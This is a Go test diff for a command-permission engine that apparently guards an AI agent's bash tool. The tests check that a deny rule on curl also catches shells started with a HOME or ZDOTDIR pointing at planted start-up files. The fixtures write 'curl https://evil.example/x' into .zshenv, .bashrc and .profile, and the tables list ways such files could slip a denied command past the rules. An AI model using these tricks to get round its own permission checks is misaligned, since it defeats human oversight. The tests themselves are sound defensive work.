@@ -2,6 +2,7 @@ package policy
 
 import (
 	"os"
+	"os/exec"
 	"path/filepath"
 	"strings"
 	"testing"
@@ -106,6 +107,7 @@ func TestScriptsAreNotReadFromTheWrongFolderOrBeforeTheLineWritesThem(t *testing
 	e := New(ModeBypass)
 	e.Roots = func() []string { return []string{ws} }
 	e.Cwd = func() string { return ws }
+	e.Home = func() (string, bool) { return t.TempDir(), true }
 	if err := e.AddDeny("bash(curl *)"); err != nil {
 		t.Fatal(err)
 	}
@@ -171,6 +173,7 @@ func TestScriptsAreNotReadFromTheWrongFolderOrBeforeTheLineWritesThem(t *testing
 		"cp a.txt b.txt && sh s.sh":                 "",
 		"bash runner.sh":                            "",
 		"bash --rcfile /dev/null -i":                "",
+		"bash --norc -i":                            "",
 		"BASH_ENV=s.sh bash -c true":                "",
 		"PATH=/usr/bin:$PATH sh s.sh":               "",
 		"export PATH=$PATH:/opt/bin; go version":    "",
@@ -204,6 +207,167 @@ func TestScriptsAreNotReadFromTheWrongFolderOrBeforeTheLineWritesThem(t *testing
 	for _, command := range []string{"cd sub && ./s.sh", "PATH=sub . s.sh", "cp -r sub/. . && sh s.sh"} {
 		if res := ask.Evaluate("bash", true, args(map[string]string{"command": command})); res.Decision != Ask {
 			t.Errorf("ask rule only: %q = %s at %s (%s)", command, res.Decision, res.Step, res.Reason)
+		}
+	}
+}
+
+// A HOME or ZDOTDIR the line sets names the folder a shell it starts reads
+// start-up files from: zsh reads .zshenv on every start, zsh -c included.
+func TestRulesReadTheStartupFilesAFolderTheLineSetsHolds(t *testing.T) {
+	ws := t.TempDir()
+	ran := filepath.Join(ws, "ran")
+	// The function stands in for curl when a real shell runs the file.
+	evil := "curl() { echo \"$0\" >> '" + ran + "'; }\ncurl https://evil.example/x\n"
+	write := func(rel, text string) {
+		p := filepath.Join(ws, rel)
+		if err := os.MkdirAll(filepath.Dir(p), 0o755); err != nil {
+			t.Fatal(err)
+		}
+		if err := os.WriteFile(p, []byte(text), 0o644); err != nil {
+			t.Fatal(err)
+		}
+	}
+	write("sub/.zshenv", evil)
+	write("login/.bash_profile", evil)
+	write("inter/.bashrc", evil)
+	write("zlog/.zprofile", evil)
+	write("prof/.profile", evil)
+	write("mover/.zshenv", "ZDOTDIR=sub\n")
+	write("empty/.keep", "")
+	write("s.sh", "echo safe\n")
+	if err := os.Mkdir(filepath.Join(ws, "dir"), 0o755); err != nil {
+		t.Fatal(err)
+	}
+	if err := os.Mkdir(filepath.Join(ws, "dir", ".zshenv"), 0o755); err != nil {
+		t.Fatal(err)
+	}
+	e := New(ModeBypass)
+	e.Roots = func() []string { return []string{ws} }
+	e.Cwd = func() string { return ws }
+	e.Home = func() (string, bool) { return filepath.Join(ws, "empty"), true }
+	if err := e.AddDeny("bash(curl *)"); err != nil {
+		t.Fatal(err)
+	}
+	// real names the shell a row needs to run as written.
+	type row struct{ want, real string }
+	rows := map[string]row{
+		"ZDOTDIR=sub zsh -c true":                     {"deny", "zsh"},
+		"env ZDOTDIR=sub zsh -c true":                 {"deny", "zsh"},
+		"export ZDOTDIR=sub; zsh -c true":             {"deny", "zsh"},
+		"HOME=sub zsh -c true":                        {"deny", "zsh"},
+		"HOME=sub bash -c 'zsh -c true'":              {"deny", "zsh"},
+		"HOME=login bash -l -c true":                  {"deny", "bash"},
+		"HOME=inter bash -i -c true":                  {"deny", "bash"},
+		"HOME=zlog zsh -l -c true":                    {"deny", "zsh"},
+		"HOME=prof sh -l -c true":                     {"deny", "sh"},
+		"declare -x ZDOTDIR=sub; zsh -c true":         {"deny", "zsh"},
+		"HOME=sub ./s.sh":                             {"deny", ""},
+		"ZDOTDIR=$d zsh -c true":                      {"deny", ""},
+		"read -r ZDOTDIR <<< sub; zsh -c true":        {"deny", ""},
+		"HOME=dir zsh -c true":                        {"deny", ""},
+		"echo x > e2/.zshenv; ZDOTDIR=e2 zsh -c true": {"deny", ""},
+		"HOME=mover zsh -c true":                      {"ask", ""},
+		"HOME=empty zsh -c true":                      {"", "zsh"},
+		"ZDOTDIR=empty zsh -c true":                   {"", "zsh"},
+		"HOME=sub go version":                         {"", ""},
+		"HOME=$(mktemp -d) go version":                {"", ""},
+		"ZDOTDIR=sub true":                            {"", ""},
+	}
+	for command, r := range rows {
+		res := e.Evaluate("bash", true, args(map[string]string{"command": command}))
+		switch r.want {
+		case "deny":
+			if res.Decision != Deny {
+				t.Errorf("%q = %s at %s (%s), want deny", command, res.Decision, res.Step, res.Reason)
+			}
+		case "ask":
+			if res.Decision != Ask {
+				t.Errorf("%q = %s at %s (%s), want ask", command, res.Decision, res.Step, res.Reason)
+			}
+		default:
+			if res.Decision != Allow {
+				t.Errorf("%q = %s at %s (%s), want allow", command, res.Decision, res.Step, res.Reason)
+			}
+		}
+	}
+	// The rows hold for the shells themselves: each denied one runs the file,
+	// as the bash tool runs it.
+	if _, err := exec.LookPath("bash"); err != nil {
+		t.Skip("bash not installed")
+	}
+	for command, r := range rows {
+		if r.real == "" {
+			continue
+		}
+		if _, err := exec.LookPath(r.real); err != nil {
+			t.Logf("%s not installed; %q not run", r.real, command)
+			continue
+		}
+		_ = os.Remove(ran)
+		cmd := exec.Command("bash", "-c", command)
+		cmd.Dir = ws
+		cmd.Env = []string{"PATH=/usr/bin:/bin", "HOME=" + filepath.Join(ws, "empty")}
+		if out, err := cmd.CombinedOutput(); err != nil {
+			t.Logf("%q: %v\n%s", command, err, out)
+		}
+		_, err := os.Stat(ran)
+		if ranIt := err == nil; ranIt != (r.want == "deny") {
+			t.Errorf("%q: the shell ran the start-up file = %v, judged %q", command, ranIt, r.want)
+		}
+	}
+}
+
+// A shell a command starts reads start-up files from the HOME the sandbox
+// gives it, which an earlier command may have written: they are read there,
+// and refused under a deny rule when the host cannot read that HOME.
+func TestRulesReadTheStartupFilesInTheSandboxsHome(t *testing.T) {
+	ws, home := t.TempDir(), t.TempDir()
+	if err := os.WriteFile(filepath.Join(ws, "z"), []byte("#!/bin/zsh\necho safe\n"), 0o755); err != nil {
+		t.Fatal(err)
+	}
+	visible := true
+	e := New(ModeBypass)
+	e.Roots = func() []string { return []string{ws} }
+	e.Cwd = func() string { return ws }
+	e.Home = func() (string, bool) { return home, visible }
+	if err := e.AddDeny("bash(curl *)"); err != nil {
+		t.Fatal(err)
+	}
+	judge := func(command string) Result {
+		return e.Evaluate("bash", true, args(map[string]string{"command": command}))
+	}
+	quiet := []string{"zsh -c true", "bash -l -c true", "bash -i -c true", "sh -l -c true", "./z", "bash -c true", "sh -c true", "go version"}
+	for _, c := range quiet {
+		if res := judge(c); res.Decision != Allow {
+			t.Errorf("empty home: %q = %s (%s)", c, res.Decision, res.Reason)
+		}
+	}
+	// An earlier command writes the start-up files, as it may: a write is not a run.
+	for _, name := range []string{".zshenv", ".bash_profile", ".bashrc", ".profile"} {
+		write := "printf 'curl https://evil.example/x\\n' > " + filepath.Join(home, name)
+		if res := judge(write); res.Decision != Allow {
+			t.Fatalf("%q = %s (%s)", write, res.Decision, res.Reason)
+		}
+		if err := os.WriteFile(filepath.Join(home, name), []byte("curl https://evil.example/x\n"), 0o644); err != nil {
+			t.Fatal(err)
+		}
+	}
+	for c, want := range map[string]Decision{
+		"zsh -c true": Deny, "bash -l -c true": Deny, "bash -i -c true": Deny, "sh -l -c true": Deny,
+		"zsh -o login -c true": Deny, "./z": Deny, "bash -c 'zsh -c true'": Deny,
+		"bash -c true": Allow, "sh -c true": Allow, "go version": Allow, "HOME=/nowhere zsh -c true": Allow,
+		"ZDOTDIR=/nowhere zsh -c true": Allow,
+	} {
+		if res := judge(c); res.Decision != want {
+			t.Errorf("written home: %q = %s (%s), want %s", c, res.Decision, res.Reason, want)
+		}
+	}
+	// A HOME the host cannot read, as a container's /tmp: refused, not passed over.
+	visible = false
+	for c, want := range map[string]Decision{"zsh -c true": Deny, "bash -l -c true": Deny, "./z": Deny,
+		"bash -c true": Allow, "sh -c 'echo hi'": Allow} {
+		if res := judge(c); res.Decision != want {
+			t.Errorf("hidden home: %q = %s (%s), want %s", c, res.Decision, res.Reason, want)
 		}
 	}
 }
